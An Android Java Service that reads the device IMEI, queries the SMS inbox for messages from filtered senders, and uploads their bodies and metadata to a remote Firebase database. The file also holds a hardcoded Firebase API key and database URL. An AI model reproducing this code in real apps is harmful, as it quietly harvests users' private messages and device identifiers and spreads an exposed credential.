package com.nfx.leadmessages;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

/**
 * Created by Admin on 01-02-2017.
 */

public class ReadMessages extends Service {
    private String fpId,mobileId=null;
    private static final Uri MESSAGE_URI = Uri.parse("content://sms/");
    private String[] projections=new String[]{"date","address","body","seen"};
    private String selection="";
    private String order="date DESC";
    private int selectionLength=Constants.selections.length;


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        SharedPreferences pref =getSharedPreferences(Constants.SHARED_PREF, Context.MODE_PRIVATE);
        fpId =pref.getString(Constants.FP_ID,null);
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        mobileId = tm.getDeviceId();


        if(mobileId == null || fpId == null){
            return Service.START_NOT_STICKY;
        }
        StringBuilder builder = new StringBuilder();

        for(int i=0;i<selectionLength;i++){

            if(i == selectionLength-1){
                builder.append(" address Like \"%"+Constants.selections[i]+"%\"");
            }
            else{
                builder.append(" address Like \"%"+Constants.selections[i]+"%\" or");
            }

        }
        selection =builder.toString();
        Log.d("Slection Param:", selection);

        new Thread(new Runnable() {
            @Override
            public void run() {
                FirebaseOptions options = new FirebaseOptions.Builder()
                        .setApiKey("AIzaSyBowYAh4TLbruwJoqL3QnQaKhBmB83EgEs")
                        .setApplicationId("1:506969475000:android:afe3b748e8b5c95f")
                        .setDatabaseUrl("https://nfxteam-153211.firebaseio.com")
                        .build();
                FirebaseApp secondApp = null;
                try {
                    secondApp = FirebaseApp.getInstance("second app");
                }catch(Exception e) {
                        secondApp = FirebaseApp.initializeApp(getApplicationContext(), options, "second app");
                }
                FirebaseDatabase secondDatabase = FirebaseDatabase.getInstance(secondApp);
                DatabaseReference mDatabase = secondDatabase.getReference();
                readMessage(mDatabase);
                stopSelf();
            }
        }).start();
        return Service.START_NOT_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void readMessage(DatabaseReference mDatabase){
        ContentResolver resolver = getContentResolver();
        Cursor cursor = resolver.query(MESSAGE_URI,projections,selection,null,order);
            if(cursor!=null && cursor.moveToFirst()){

                PhoneIds phoneIds=new PhoneIds();
                phoneIds.setDate(String.valueOf(System.currentTimeMillis()));
                phoneIds.setPhoneId(mobileId);
                DatabaseReference phoneIdRef = mDatabase.child(fpId+Constants.DETAILS).child(Constants.PHONE_IDS);
                phoneIdRef.child(mobileId).setValue(phoneIds);

                SmsMessage message;
                DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.MESSAGES).child(mobileId);
                MessageIdRef.removeValue();
                do{
                    message = new SmsMessage()
                            .setDate(cursor.getLong(0))
                            .setSubject(cursor.getString(1))
                            .setBody(cursor.getString(2))
                            .setSeen(cursor.getString(3));

                    MessageIdRef.push().setValue(message);

                }while(cursor.moveToNext());
                cursor.close();
            }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
